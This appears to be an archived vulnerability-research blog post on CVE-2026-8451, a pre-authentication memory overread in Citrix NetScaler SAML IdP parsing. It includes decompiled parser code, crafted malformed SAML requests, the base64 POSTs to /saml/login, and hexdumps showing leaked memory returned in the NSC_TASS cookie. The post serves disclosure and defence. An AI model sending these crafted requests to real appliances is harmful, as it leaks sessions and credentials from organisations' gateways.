---
title: "CitrixBleed To Infinity And Beyond (Citrix NetScaler Pre-Auth Memory Overread CVE-2026-8451)"
source: "watchTowr Labs"
url: https://labs.watchtowr.com/citrixbleed-to-infinity-and-beyond-citrix-netscaler-pre-auth-memory-overread-cve-2026-8451/
published: 2026-07-01
fetched: 2026-11-19T10:48:37.911925+08:00
category: "防火墙"
score: 8.4
keywords: ["pre-auth", "citrix", "netscaler"]
sha256: d6ad13035724c77f566e01e4452b31552b54a39ebe3f5e925f644bf9e0a79790
bytes: 34920
truncated: false
body_mode: fulltext
kind: practical
status: published
published_at: 2026-11-19T11:44:34.056544+08:00
---

# CitrixBleed To Infinity And Beyond (Citrix NetScaler Pre-Auth Memory Overread CVE-2026-8451)

> 来源：watchTowr Labs · 2026-07-01 · [原文](https://labs.watchtowr.com/citrixbleed-to-infinity-and-beyond-citrix-netscaler-pre-auth-memory-overread-cve-2026-8451/)
> 自动抓取快照，仅供安全研究参考；版权归原作者所有。

## 收录理由

- **核心**：NetScaler 未认证内存越界读（CVE-2026-8451），延续 CitrixBleed 家族，可批量泄露进程内存中的会话与凭据。
- **价值**：越界读在边缘设备上是“静默窃取”：不崩溃、不写盘，检测极难，而收益是海量会话。
- **难度**：中：利用门槛不高，但影响面和隐蔽性极强。

This research is a glimpse into the capability powering the watchTowr Platform, a Preemptive Exposure Management solution. We enable organizations to autonomously validate and mitigate their exposure to emerging threats, ahead of in-the-wild exploitation.

 Request a demo

Well, well, well - once again, the cat has dragged us in and spat us out.

Today, we find ourselves questioning the reality we sit within. Must it be so predictable, and why us? “But watchTowr, what do you mean?”

Well, if you’re here, you likely fit into one of the following categories:

- A dear reader,
- A group therapy accomplice
- A Groundhog Day fan club member

Why? Because we once again find ourselves talking about Citrix NetScalers. Yes, that’s right, we’ve found another excuse to create memes and mock promise rings.

For those that don’t start violently wretching when the phrase “Citrix NetScaler” is uttered, we have another word to whisper: “CitrixBleed”.

As many know, the term CitrixBleed now refers to not a single vulnerability, but an entire class of Memory Disclosure-esque vulnerabilities in Citrix NetScaler devices, many of which have played roles in breaches and incidents in recent memory.

For those new to this trauma, the following prior reading may be of interest:

- How Much More Must We Bleed? - Citrix NetScaler Memory Disclosure (CitrixBleed 2 CVE-2025-5777)
- Is It CitrixBleed4? Well, No. Is It Good? Also, No. (Citrix NetScaler Memory Leak & RXSS CVE-2025-12101)
- The Sequels Are Never As Good, But We're Still In Pain (Citrix NetScaler CVE-2026-3055 Memory Overread)
- Please, We Beg, Just One Weekend Free Of Appliances (Citrix NetScaler CVE-2026-3055 Memory Overread Part 2)

"We told you so”, we want to scream.

Huh? Why? Because, we have constantly reiterated our concern that the Memory Disclosure-esque class of vulnerability appears to be endemic within Citrix NetScaler devices - to the point where we’ve now found further instances either by accident or while analyzing and reproducing another instance of the same vulnerability class in the same appliance a mere few months ago.

Yes, that’s right - today, a Secure By Design promise ring pledge commitment hall-of-famer is back to haunt us as Citrix has now publicly disclosed the zero-day Memory Disclosure vulnerability we reported in March 2026.

We’ve given up counting the numbers, and so we’ve decided to call this vulnerability “CitrixBleed To Infinity And Beyond”:

![image](https://storage.ghost.io/c/a0/dc/a0dcbbe4-0ae7-4d7e-90f7-ebbc3a0f5a84/content/images/2026/06/image-34.png)

Referencing what we wrote previously, because it is demonstrably evergreen:

> However, what should be of concern is the bigger picture - the trend, which is very clearly suggesting that memory management continues to appear fragile within Citrix NetScaler appliances, to the extent that even accidentally misconfiguring an appliance can lead to the disclosure of leaked memory.

> It feels like we are playing catch with a highly-sensitive gun that continues to harm innocent bystanders - within, once again, what many will consider a highly-critical appliance and security control.

> Will we see another memory leak vulnerability in Citrix NetScaler? We have no idea. But if we were to meme…

![image](https://storage.ghost.io/c/a0/dc/a0dcbbe4-0ae7-4d7e-90f7-ebbc3a0f5a84/content/images/2026/06/image-32.png)

As always, watchTowr clients gain industry-first access to our research days (in this case, months) before publication to validate their exposure, accompanied by Active Defense capabilities to autonomously mitigate exposure.

This research is a glimpse into the capabilities that power our Preemptive Exposure Management solution and get organizations ahead of inevitable in-the-wild exploitation: the watchTowr Platform.

### What Is Citrix NetScaler and NetScaler Gateway?

Citrix NetScaler (formally rebranded, then un-rebranded, in the way that only enterprise networking vendors can truly pull off) is a family of application delivery controllers and VPN gateway appliances found in virtually every large enterprise network on the planet. NetScaler handles load balancing, SSL offloading, authentication, and remote access - and NetScaler Gateway specifically serves as the front door for thousands of organizations' remote access infrastructure.

It is, in other words, exactly the kind of product we love to look at, while also being a natural disaster.

### What Is CVE-2026-8451?

Citrix eloquently describes CVE-2026-8451 as: “Insufficient input validation leading to memory overread”.

Naturally, they’ve assigned CVE-2026-8451 to the vulnerability and rated it a CVSS of 8.8. Of note is that for this vulnerability to be exploitable, matching CitrixBleed3?4?, the NetScaler appliance has to be configured as a SAML IDP.

Within their advisory, Citrix states the following products are affected:

- NetScaler ADC and NetScaler Gateway 14.1 BEFORE 14.1-72.61
- NetScaler ADC and NetScaler Gateway 13.1 BEFORE 13.1-63.18
- NetScaler ADC FIPS BEFORE 14.1-72.61 FIPS
- NetScaler ADC FIPS and NDcPP BEFORE 13.1-37.272

Let’s dive in.

### Hunting (Unfortunately Not) Rare Vulnerabilities

It was a late night in Pallet Town, and we, the intrepid hero, were searching for rare Pokémon vulnerabilities in the long grass of the Citrix NetScaler.

Doing “what we do best”, back in March we found ourselves feverishly analyzing patches and changes to reproduce CVE-2026-3055 aka CitrixBleed4(?) affecting NetScaler’s configured as an IDP provider.

![image](https://storage.ghost.io/c/a0/dc/a0dcbbe4-0ae7-4d7e-90f7-ebbc3a0f5a84/content/images/2026/06/image-33.png)

With a NetScaler up and running, configured as an SAML IdP, we skimmed through relevant attack surface. We say skimmed, because in reality, SAML itself doesn't expose a huge amount of functionality for us to poke prod - effectively a handful of authentication endpoints, and not much else (intended, anyway).

Thus, it seemed natural to start at the beginning: /saml/login.

Anyone familiar with SAML will know that clients kick off authentication by submitting a base64-encoded XML document to an endpoint like this. Buried inside that XML document is an AuthnRequest, which describes everything the identity provider needs to know, including the issuer, destination, timestamps, and a handful of other attributes.

With nothing else to catch our attention, we decided to take what we were given and focus here.

As anyone who has spent time hunting vulnerabilities will tell you, after hopefully recovering, XML parsers are deceptively difficult to implement correctly. Even experienced developers (and others.. that sign pledges…) generally know better to not do anything else except rely on well-tested libraries.

Citrix, however, appears to have chosen a different path. To ensure allegiance to the pledge.

The result is delightful snippets like the following, taken from the code responsible for parsing XML attributes such as foo="bar":

```
cursor = <some string input>

whitespaceCharList = 0x100002600;

// Skip leading whitespace
for ( lookahead = (v32 + 28); ; lookahead++ )
{
	ch = *cursor;
	if ( ch > '=' )
		break;
	if ( !_bittest64(&whitespaceCharList, ch) )
	{
		if ( ch == '=' )
		{
			while ( 1 )
			{
				ch = *lookahead;
				if ( ch > 0x20 || !_bittest64(&whitespaceCharList, ch) )
					break;
				++lookahead;
			}
			cursor = lookahead;
		}
		break;
	}
	++cursor;
}

// Determine how the value is quoted. This accepts both single and double quotes, or
// no quotes at all (in which case, the value is terminated by whitespace).
if ( ch == '\'' || ch == '"' )
{
	terminator = ch;
	first = *++cursor;
}
else
{
	terminator = ' ';
	first = ch;
}
if ( first == terminator )
	return 0xE0002;		// The value is empty.

// Now walk forward until we find the terminator.
scanPos = cursor;
while ( first != '\0' && first != '>' )
{
	scanPos++;
	first = *scanPos;
	if (first == terminator)
		break
}

if ( scanPos == cursor )
	return 0xE0002;		// the value is empty.

out->value_ptr = cursor;
out->value_len = scanPos - cursor;
```

The first thing that probably jumps out is the slightly odd-looking _bittest64() call.

Fortunately, it isn't doing anything particularly exotic.

It simply checks whether a character belongs to a predefined set, encoded as bit positions within the constant 0x100002600. In practice, that means it matches the characters 0x09, 0x0A, 0x0D, and 0x20, which correspond to horizontal tab, line feed, carriage return, and space.

There is one subtle detail. ASCII values range from 0 to 255, while the lookup table is only 64 bits wide. The > 0x20 check exists to avoid indexing beyond the end of that table.

The comments should make the rest of the function fairly easy to follow. Its job is simply to locate the value portion of an XML attribute and return both a pointer to the value and its length.

It also looks... a little questionable. If your promise ring isn’t reverberating yet, you should probably charge it. As we’ve regularly seen and been forced to dea with, string parsing code has a habit of hiding subtle bugs - and surprise, this implementation has a few characteristics that immediately made us suspicious.

For example, there are no obvious bounds checks. If the input is malformed enough, it looks entirely possible for the parser to read past the end of the input buffer. What happens if an attribute value is never terminated?

But things get even stranger when you look at the parser's termination logic.

Throughout most of the function, _bittest64() is used to recognize the characters that terminate a value. However, there is one special case: unquoted attribute values.

In that path, whitespace is no longer treated as a terminator. Instead, the parser only stops when it encounters a null byte, a closing >, or the matching quote character.

That difference might seem insignificant, but it turns out to matter quite a bit (no way!).

### A Wild NetScaler Appears! watchTowr used “Mean Look To See If It Falls Over”.

Having seen the quality of XML parsers in general, let alone Citrix’s track record that we’ve already discussed, we did what anyone would do - we let our small pets walk across our keyboards, and watched for unexpected intended functionality.

Fortunately, NetScaler makes this fairly easy (we supplied the pets).

A quick shell command drops you into the underlying operating system, where you can simply tail the relevant log file:

```
/var/log/ns.log
```

That gives us a front-row seat to exactly how the parser interprets our input.

We'll start with a minimal SAML AuthnRequest. It gives us a clean baseline before we begin progressively breaking things and observing how the parser responds:

```
<samlp:AuthnRequest
	xmlns:samlp="urn:oasis:names:tc:SAML:2.0:protocol"
	xmlns:saml="urn:oasis:names:tc:SAML:2.0:assertion"
	ID="_99d3e71118f42305e05acb14ad0bd917"
	Version="2.0"
	ProviderName="SP test"
	Destination="<http://idp.example.com/SSOService.php>"
	ProtocolBinding="urn:oasis:names:tc:SAML:2.0:bindings:HTTP-POST"
	AssertionConsumerServiceURL="<http://sp.example.com/demo1/index.php?acs>">
	<saml:Issuer><http://sp.example.com/demo1/metadata.php></saml:Issuer>
	<samlp:NameIDPolicy Format="urn:oasis:names:tc:SAML:1.1:nameid-format:emailAddress" AllowCreate="true"/>
	<samlp:RequestedAuthnContext Comparison="exact">
	<saml:AuthnContextClassRef>urn:oasis:names:tc:SAML:2.0:ac:classes:PasswordProtectedTransport</saml:AuthnContextClassRef>
	</samlp:RequestedAuthnContext>
</samlp:AuthnRequest>
```

After base64-encoding the request and sending it, we keep one eye on the logs and one eye on the debugger. As expected, NetScaler parses each of the values correctly:

```
POST /saml/login HTTP/1.1
Host: all-ur-boxen.com
Content-Length: 1090

SAMLRequest=PHNhbWxwOkF1dGhuUmVxdWVzdCAKCXhtbG5zOnNhbWxwPSJ1cm46b2FzaXM6bmFtZXM6dGM6U0FNTDoyLjA6cHJvdG9jb2wiIAoJeG1sbnM6c2FtbD0idXJuOm9hc2lzOm5hbWVzOnRjOlNBTUw6Mi4wOmFzc2VydGlvbiIgCglJRD0iXzk5ZDNlNzExMThmNDIzMDVlMDVhY2IxNGFkMGJkOTE3IiAKCVZlcnNpb249IjIuMCIgCglQcm92aWRlck5hbWU9IlNQIHRlc3QiIAoJRGVzdGluYXRpb249Imh0dHA6Ly9pZHAuZXhhbXBsZS5jb20vU1NPU2VydmljZS5waHAiIAoJUHJvdG9jb2xCaW5kaW5nPSJ1cm46b2FzaXM6bmFtZXM6dGM6U0FNTDoyLjA6YmluZGluZ3M6SFRUUC1QT1NUIiAKCUFzc2VydGlvbkNvbnN1bWVyU2VydmljZVVSTD0iaHR0cDovL3NwLmV4YW1wbGUuY29tL2RlbW8xL2luZGV4LnBocD9hY3MiPgoJPHNhbWw6SXNzdWVyPmh0dHA6Ly9zcC5leGFtcGxlLmNvbS9kZW1vMS9tZXRhZGF0YS5waHA8L3NhbWw6SXNzdWVyPgoJPHNhbWxwOk5hbWVJRFBvbGljeSBGb3JtYXQ9InVybjpvYXNpczpuYW1lczp0YzpTQU1MOjEuMTpuYW1laWQtZm9ybWF0OmVtYWlsQWRkcmVzcyIgQWxsb3dDcmVhdGU9InRydWUiLz4KCTxzYW1scDpSZXF1ZXN0ZWRBdXRobkNvbnRleHQgQ29tcGFyaXNvbj0iZXhhY3QiPgoJPHNhbWw6QXV0aG5Db250ZXh0Q2xhc3NSZWY%2bdXJuOm9hc2lzOm5hbWVzOnRjOlNBTUw6Mi4wOmFjOmNsYXNzZXM6UGFzc3dvcmRQcm90ZWN0ZWRUcmFuc3BvcnQ8L3NhbWw6QXV0aG5Db250ZXh0Q2xhc3NSZWY%2bCgk8L3NhbWxwOlJlcXVlc3RlZEF1dGhuQ29udGV4dD4KPC9zYW1scDpBdXRoblJlcXVlc3Q%2b
```

The HTTP response is just a 302 (honestly, it’s contents are not particularly interesting, so we have omitted them):

```
HTTP/1.1 302 Object Moved
Location: /vpn/index.html
Set-Cookie: NSC_TASS=YXNkZgBJRD1fOTlkM2U3MTExOGY0MjMwNWUwNWFjYjE0YWQwYmQ5MTcmYmluZD1wb3N0JkFDU1VSTD1odHRwOi8vc3AuZXhhbXBsZS5jb20vZGVtbzEvaW5kZXgucGhwP2FjcwA=;HttpOnly;Path=/;Secure
Content-Security-Policy: default-src 'self'; script-src 'self'; connect-src 'self'; img-src <http://localhost>:* 'self' data:; style-src 'self' 'unsafe-inline'; font-src 'self' data:; frame-src 'self'; child-src 'self' com.citrix.agmacepa://* citrixng://* com.citrix.nsgclient://* vmware-view:// nsgcepa://nsgcepa application://*; form-action  'self'; object-src 'none'; base-uri 'self'; report-uri /nscsp_violation/report_uri
Set-Cookie: NSC_AAAC=xyz;Path=/;expires=Wednesday, 09-Nov-1999 23:12:40 GMT;Secure
Set-Cookie: NSC_EPAC=xyz;Path=/;expires=Wednesday, 09-Nov-1999 23:12:40 GMT;Secure
Set-Cookie: NSC_USER=xyz;Path=/;expires=Wednesday, 09-Nov-1999 23:12:40 GMT;Secure
Set-Cookie: NSC_TEMP=xyz;Path=/;expires=Wednesday, 09-Nov-1999 23:12:40 GMT;Secure
Set-Cookie: NSC_PERS=xyz;Path=/;expires=Wednesday, 09-Nov-1999 23:12:40 GMT;Secure
Set-Cookie: NSC_BASEURL=xyz;Path=/;expires=Wednesday, 09-Nov-1999 23:12:40 GMT;Secure
Set-Cookie: CsrfToken=xyz;Path=/;expires=Wednesday, 09-Nov-1999 23:12:40 GMT;Secure
Set-Cookie: CtxsAuthId=xyz;Path=/;expires=Wednesday, 09-Nov-1999 23:12:40 GMT;Secure
Set-Cookie: ASP.NET_SessionId=xyz;Path=/;expires=Wednesday, 09-Nov-1999 23:12:40 GMT;Secure
Set-Cookie: NSC_TMAA=xyz;Path=/;expires=Wednesday, 09-Nov-1999 23:12:40 GMT
Set-Cookie: NSC_TMAS=xyz;Path=/;expires=Wednesday, 09-Nov-1999 23:12:40 GMT;Secure
Set-Cookie: NSC_TEMP=xyz;Path=/;expires=Wednesday, 09-Nov-1999 23:12:40 GMT
Set-Cookie: NSC_PERS=xyz;Path=/;expires=Wednesday, 09-Nov-1999 23:12:40 GMT
Set-Cookie: NSC_AAAC=xyz;Path=/;expires=Wednesday, 09-Nov-1999 23:12:40 GMT
X-Content-Type-Options: nosniff
X-XSS-Protection: 1; mode=block
Content-Length: 398
Cache-control: no-cache, no-store, must-revalidate
Pragma: no-cache
Content-Type: text/html; charset=utf-8

<html><head><META HTTP-EQUIV="Content-Type" CONTENT="text/html; charset=UTF-8"><script type="text/javascript" src="/vpn/resources.js"></script><script type="text/javascript" src="/vpn/init/redirection_body_resources.js"></script></head><body><span id="This object may be found "></span><a href="/vpn/index.html"><span id="here"></span></a><span id="Trailing phrase after here"></span></body></html>
```

And in our friendly logs….:

```
AuthnReq start tag parsed, id=<_99d3e71118f42305e05acb14ad0bd917>,
acs=<http://sp.example.com/demo1/index.php?acs>, forceAuth=<0>, binding=<POST>,
following data  "    ProtocolBinding="urn:oasis:names:tc:SAML:2.0:bindings:HTTP-POST"        AssertionConsumerServiceURL=""
```

So far, nothing particularly surprising. NetScaler successfully extracts the ID and AssertionConsumerServiceURL attributes, while ForceAuthn falls back to its default value.

However, we were still deeply suspicious of the attribute parser. Earlier, we pointed out that unquoted attribute values are terminated differently from quoted ones. With not much faith left in humanity, we wondered what would happen if we used a newline to terminate one.

There was only one way to find out - yes, the pets were asked to walk across our keyboards, again.

```
<samlp:AuthnRequest Version="2.0" AssertionConsumerServiceURL=11
id=22>
<saml:Issuer>watchtowr</saml:Issuer>
</samlp:AuthnRequest>
```

This time, we've replaced the space after AssertionConsumerServiceURL with a newline.

Once again, we base64-encode the document and POST it to /saml/login:

```
POST /saml/login HTTP/1.1
Host: 192.168.80.125
Content-Length: 190

SAMLRequest=PHNhbWxwOkF1dGhuUmVxdWVzdCBWZXJzaW9uPSIyLjAiIEFzc2VydGlvbkNvbnN1bWVyU2VydmljZVVSTD0xMQppZD0yMj4KPHNhbWw6SXNzdWVyPndhdGNodG93cjwvc2FtbDpJc3N1ZXI%2bCjwvc2FtbHA6QXV0aG5SZXF1ZXN0Pg==
```

The response is practically the same as before:

```
HTTP/1.1 302 Object Moved
Location: /vpn/index.html
Set-Cookie: NSC_TASS=YXNkZgBJRD0yMiZiaW5kPXBvc3QmQUNTVVJMPTExCmlkPTIyAA==;HttpOnly;Path=/;Secure
Content-Security-Policy: default-src 'self'; script-src 'self'; connect-src 'self'; img-src <http://localhost>:* 'self' data:; style-src 'self' 'unsafe-inline'; font-src 'self' data:; frame-src 'self'; child-src 'self' com.citrix.agmacepa://* citrixng://* com.citrix.nsgclient://* vmware-view:// nsgcepa://nsgcepa application://*; form-action  'self'; object-src 'none'; base-uri 'self'; report-uri /nscsp_violation/report_uri
Set-Cookie: NSC_AAAC=xyz;Path=/;expires=Wednesday, 09-Nov-1999 23:12:40 GMT;Secure
Set-Cookie: NSC_EPAC=xyz;Path=/;expires=Wednesday, 09-Nov-1999 23:12:40 GMT;Secure
Set-Cookie: NSC_USER=xyz;Path=/;expires=Wednesday, 09-Nov-1999 23:12:40 GMT;Secure
Set-Cookie: NSC_TEMP=xyz;Path=/;expires=Wednesday, 09-Nov-1999 23:12:40 GMT;Secure
Set-Cookie: NSC_PERS=xyz;Path=/;expires=Wednesday, 09-Nov-1999 23:12:40 GMT;Secure
Set-Cookie: NSC_BASEURL=xyz;Path=/;expires=Wednesday, 09-Nov-1999 23:12:40 GMT;Secure
Set-Cookie: CsrfToken=xyz;Path=/;expires=Wednesday, 09-Nov-1999 23:12:40 GMT;Secure
Set-Cookie: CtxsAuthId=xyz;Path=/;expires=Wednesday, 09-Nov-1999 23:12:40 GMT;Secure
Set-Cookie: ASP.NET_SessionId=xyz;Path=/;expires=Wednesday, 09-Nov-1999 23:12:40 GMT;Secure
Set-Cookie: NSC_TMAA=xyz;Path=/;expires=Wednesday, 09-Nov-1999 23:12:40 GMT
Set-Cookie: NSC_TMAS=xyz;Path=/;expires=Wednesday, 09-Nov-1999 23:12:40 GMT;Secure
Set-Cookie: NSC_TEMP=xyz;Path=/;expires=Wednesday, 09-Nov-1999 23:12:40 GMT
Set-Cookie: NSC_PERS=xyz;Path=/;expires=Wednesday, 09-Nov-1999 23:12:40 GMT
Set-Cookie: NSC_AAAC=xyz;Path=/;expires=Wednesday, 09-Nov-1999 23:12:40 GMT
X-Content-Type-Options: nosniff
X-XSS-Protection: 1; mode=block
Content-Length: 398
Cache-control: no-cache, no-store, must-revalidate
Pragma: no-cache
Content-Type: text/html; charset=utf-8

<html><head><META HTTP-EQUIV="Content-Type" CONTENT="text/html; charset=UTF-8"><script type="text/javascript" src="/vpn/resources.js"></script><script type="text/javascript" src="/vpn/init/redirection_body_resources.js"></script></head><body><span id="This object may be found "></span><a href="/vpn/index.html"><span id="here"></span></a><span id="Trailing phrase after here"></span></body></html>
```

With the log file… not being so coy:

```
AuthnReq start tag parsed, id=<22>, acs=<11 id=22>, forceAuth=<0>, binding=<Unknown>,
following data  Version="2.0" AssertionConsumerServiceURL=11 id=22> <saml:Issuer>watchtowr</saml:Issuer> </samlp:Au"
```

That's... interesting.

You might have to read the log twice before it jumps out at you.

Notice that the acs value has been parsed as:

```
11 id=22
```

That is clearly wrong. Looking at the XML we sent, the value should simply be 11.

Instead, the parser has read past the correct end of the attribute, failed to recognize the newline as a valid terminator (exactly as we suspected), and continued consuming input until it eventually encountered the > terminating the AuthnRequest start tag.

Then, things became even more interesting.

As we saw earlier, this XML parser is surprisingly relaxed about what constitutes a valid closing tag. In particular, it is happy to accept a < as the terminator for an AuthnRequest start tag instead of the expected >.

That means we can take things one step further. If we terminate both AssertionConsumerServiceURL and ID with newlines, and leave the opening AuthnRequest tag unclosed, we end up with the following request:

```
<samlp:AuthnRequest Version="2.0" AssertionConsumerServiceURL=
id=
<saml:Issuer>watchtowr</saml:Issuer>
</samlp:AuthnRequest>
```

Let’s base64 and send it on its way:

```
POST /saml/login HTTP/1.1
Host: 192.168.80.125
Content-Length: 180

SAMLRequest=PHNhbWxwOkF1dGhuUmVxdWVzdCBWZXJzaW9uPSIyLjAiIEFzc2VydGlvbkNvbnN1bWVyU2VydmljZVVSTD0KaWQ9CjxzYW1sOklzc3Vlcj53YXRjaHRvd3I8L3NhbWw6SXNzdWVyPgo8L3NhbWxwOkF1dGhuUmVxdWVzdD4=
```

The response is, again, uninteresting:

```
HTTP/1.1 302 Object Moved
Location: /vpn/index.html
Set-Cookie: NSC_TASS=YXNkZgBJRD08c2FtbDpJc3N1ZXImYmluZD1wb3N0JkFDU1VSTD1pZD0KPHNhbWw6SXNzdWVyAA==;HttpOnly;Path=/;Secure
Content-Security-Policy: default-src 'self'; script-src 'self'; connect-src 'self'; img-src <http://localhost>:* 'self' data:; style-src 'self' 'unsafe-inline'; font-src 'self' data:; frame-src 'self'; child-src 'self' com.citrix.agmacepa://* citrixng://* com.citrix.nsgclient://* vmware-view:// nsgcepa://nsgcepa application://*; form-action  'self'; object-src 'none'; base-uri 'self'; report-uri /nscsp_violation/report_uri
Set-Cookie: NSC_AAAC=xyz;Path=/;expires=Wednesday, 09-Nov-1999 23:12:40 GMT;Secure
Set-Cookie: NSC_EPAC=xyz;Path=/;expires=Wednesday, 09-Nov-1999 23:12:40 GMT;Secure
Set-Cookie: NSC_USER=xyz;Path=/;expires=Wednesday, 09-Nov-1999 23:12:40 GMT;Secure
Set-Cookie: NSC_TEMP=xyz;Path=/;expires=Wednesday, 09-Nov-1999 23:12:40 GMT;Secure
Set-Cookie: NSC_PERS=xyz;Path=/;expires=Wednesday, 09-Nov-1999 23:12:40 GMT;Secure
Set-Cookie: NSC_BASEURL=xyz;Path=/;expires=Wednesday, 09-Nov-1999 23:12:40 GMT;Secure
Set-Cookie: CsrfToken=xyz;Path=/;expires=Wednesday, 09-Nov-1999 23:12:40 GMT;Secure
Set-Cookie: CtxsAuthId=xyz;Path=/;expires=Wednesday, 09-Nov-1999 23:12:40 GMT;Secure
Set-Cookie: ASP.NET_SessionId=xyz;Path=/;expires=Wednesday, 09-Nov-1999 23:12:40 GMT;Secure
Set-Cookie: NSC_TMAA=xyz;Path=/;expires=Wednesday, 09-Nov-1999 23:12:40 GMT
Set-Cookie: NSC_TMAS=xyz;Path=/;expires=Wednesday, 09-Nov-1999 23:12:40 GMT;Secure
Set-Cookie: NSC_TEMP=xyz;Path=/;expires=Wednesday, 09-Nov-1999 23:12:40 GMT
Set-Cookie: NSC_PERS=xyz;Path=/;expires=Wednesday, 09-Nov-1999 23:12:40 GMT
Set-Cookie: NSC_AAAC=xyz;Path=/;expires=Wednesday, 09-Nov-1999 23:12:40 GMT
X-Content-Type-Options: nosniff
X-XSS-Protection: 1; mode=block
Content-Length: 398
Cache-control: no-cache, no-store, must-revalidate
Pragma: no-cache
Content-Type: text/html; charset=utf-8

<html><head><META HTTP-EQUIV="Content-Type" CONTENT="text/html; charset=UTF-8"><script type="text/javascript" src="/vpn/resources.js"></script><script type="text/javascript" src="/vpn/init/redirection_body_resources.js"></script></head><body><span id="This object may be found "></span><a href="/vpn/index.html"><span id="here"></span></a><span id="Trailing phrase after here"></span></body></html>
```

.. but the generated log is far from boring:

```
AuthnReq start tag parsed, id=<<saml:Issuer>, acs=<id= <saml:Issuer>,
forceAuth=<0>, binding=<Unknown>, following data  Version="2.0" AssertionConsumerServiceURL= id= <saml:Issuer>watchtowr</saml:Issuer> </samlp:AuthnRe"
```

So far, our theory holds up.

The AssertionConsumerServiceURL value is not terminated at the newline. Instead, the parser keeps reading until it encounters the > from the closing Issuer tag. The ID attribute behaves exactly the same way.

At this point, it is pretty clear that we have an overread. The parser is reading well beyond the intended bounds of each attribute value. We are still only reading XML that happens to be present in the input buffer, but the parser is clearly consuming far more data than it should.

That is already interesting, but the obvious question is: “Do we lease our bug-hunting pets?” Sometimes.

The other question you may be inclined to ask, may resemble the following: “Where does all of this overread data end up?

To answer that, we need to look at what this function actually produces.

On success, it returns an HTTP response containing an NSC_TASS cookie. Among other things, this cookie stores the ID and AssertionConsumerServiceURL values that were parsed from the incoming XML request:

```
NSC_TASS=YXNkZgBJRD08c2FtbDpJc3N1ZXImYmluZD1wb3N0JkFDU1VSTD1pZD0KPHNhbWw6SXNzdWVyAA==
```

This decodes to:

```
00000000  61 73 64 66 00 49 44 3d  3c 73 61 6d 6c 3a 49 73  |asdf.ID=<saml:Is|
00000010  73 75 65 72 26 62 69 6e  64 3d 70 6f 73 74 26 41  |suer&bind=post&A|
00000020  43 53 55 52 4c 3d 69 64  3d 0a 3c 73 61 6d 6c 3a  |CSURL=id=.<saml:|
00000030  49 73 73 75 65 72 00                              |Issuer.|
```

asdf is simply the configured provider name. The interesting part is everything that follows.

You can see the values parsed from our XML request being embedded directly into the cookie. The ID field now contains <saml:Issuer, and the ACSURL field has similarly consumed data well beyond the intended attribute value.

Shock - we are once again miserable about the world (we say, fiddling with our promise rings).

We’ve so far demonstrated what nobody needed a crystal ball to predict - the NetScaler appliance is willing to return data it never should have associated with those attributes. So far, though, the overread is still confined to our own request buffer.

The next challenge is obvious: instead of reading within the request, can we make it read beyond the end of the request?

![image](https://storage.ghost.io/c/a0/dc/a0dcbbe4-0ae7-4d7e-90f7-ebbc3a0f5a84/content/images/2026/06/image-35.png)

### Reading Into The Unknown

We spent quite a while trying to figure out how to push the parser past the end of the request buffer. After a healthy amount of trial and error, we concluded that our login request to /saml/login needed to satisfy a few conditions:

- It must contain both a <samlp:AuthnRequest> and a corresponding </samlp:AuthnRequest>. We can't simply leave the request unterminated.
- It must contain a valid <saml:Issuer>watchtowr</saml:Issuer>.
- It must contain either an AssertionConsumerServiceURL= or ID attribute terminated by a newline, or not terminated at all.

At first glance, those requirements seem mutually exclusive.

They aren't.

By this point, we'd already learned just how forgiving the parser was. We'd shown that the opening AuthnRequest tag didn't actually need a closing >, but we also discovered something even stranger: the parser was surprisingly relaxed about element nesting.

For example:

```
<samlp:AuthnRequest Version="2.0" AssertionConsumerServiceURL=11
id=22
</samlp:AuthnRequest>
<saml:Issuer>watchtowr</saml:Issuer>
```

Here we’ve got the same request as before - but this time, the Issuer is moved outside the AuthnRequest.

Any sane parser would reject this, but we’re not dealing with sanity. Of course, the NetScaler appliance actually accepts it.

```
AuthnReq start tag parsed, id=<22 <saml:Issuer>, acs=<11 id=22 <saml:Issuer>, forceAuth=<0>, binding=<Unknown>
```

One important detail is that this only works if the opening AuthnRequest tag is left unterminated. If it is closed normally, the parser rejects the document, strongly suggesting the behavior we’re observing is tied to the parser's attribute-handling logic.

Once we realized that, we started experimenting a little more. It turns out the parser is surprisingly tolerant of attribute ordering as well. For example:

```
<samlp:AuthnRequest
<saml2:issuer>watchtowr</saml2:issuer>
</samlp:AuthnRequest>
Version="2.0"
id="11"
AssertionConsumerServiceURL="22"
```

This yields a successful response - although the extracted details are incorrect:

```
AuthnReq start tag parsed, id=<>, acs=<22>, forceAuth=<0>, binding=<Unknown>
```

You might note that the acs value returned is correct - 22 - because we’ve carefully enclosed the value in the request in quotes.

What happens if we can make the parser overread past the end of the request buffer instead?

```
<samlp:AuthnRequest
<saml2:issuer>watchtowr</saml2:issuer>
</samlp:AuthnRequest>
Version="2.0"
id="11"
AssertionConsumerServiceURL=
```

And in our favorite log…:

```
AuthnReq start tag parsed, id=<>, acs=<▒^M▒ﾭ▒="2.0" id="11"
AssertionConsumerServiceURL="22"ﾭ▒mple.com/demo1/index.php</saml:Issuer>,
forceAuth=<0>, binding=<Unknown>
```

![image](https://storage.ghost.io/c/a0/dc/a0dcbbe4-0ae7-4d7e-90f7-ebbc3a0f5a84/content/images/2026/06/image-36.png)

OH HO HO. Finally, we’re almost there!

The parser is no longer just reading extra XML. It's pulling arbitrary binary data from beyond the end of the XML buffer and happily appending it to the parsed value.

The only question left is whether that value makes it all the way back to us via the NSC_TASS cookie we looked at earlier:

```
NSC_TASS=YXNkZgBJRD0mYmluZD1wb3N0JkFDU1VSTD3wDZDvvq3ePSIyLjAiCmlkPSIxMSIKQXNzZXJ0aW9uQ29uc3VtZXJTZXJ2aWNlVVJMPSIyMiLvvq3ebXBsZS5jb20vZGVtbzEvaW5kZXgucGhwPC9zYW1sOklzc3VlcgA=
```

And decoded…:

```
00000000  61 73 64 66 00 49 44 3d  26 62 69 6e 64 3d 70 6f  |asdf.ID=&bind=po|
00000010  73 74 26 41 43 53 55 52  4c 3d f0 0d 90 ef be ad  |st&ACSURL=......|
00000020  de 3d 22 32 2e 30 22 0a  69 64 3d 22 31 31 22 0a  |.="2.0".id="11".|
00000030  41 73 73 65 72 74 69 6f  6e 43 6f 6e 73 75 6d 65  |AssertionConsume|
00000040  72 53 65 72 76 69 63 65  55 52 4c 3d 22 32 32 22  |rServiceURL="22"|
00000050  ef be ad de 6d 70 6c 65  2e 63 6f 6d 2f 64 65 6d  |....mple.com/dem|
00000060  6f 31 2f 69 6e 64 65 78  2e 70 68 70 3c 2f 73 61  |o1/index.php</sa|
00000070  6d 6c 3a 49 73 73 75 65  72 00                    |ml:Issuer.|
```

Finally!

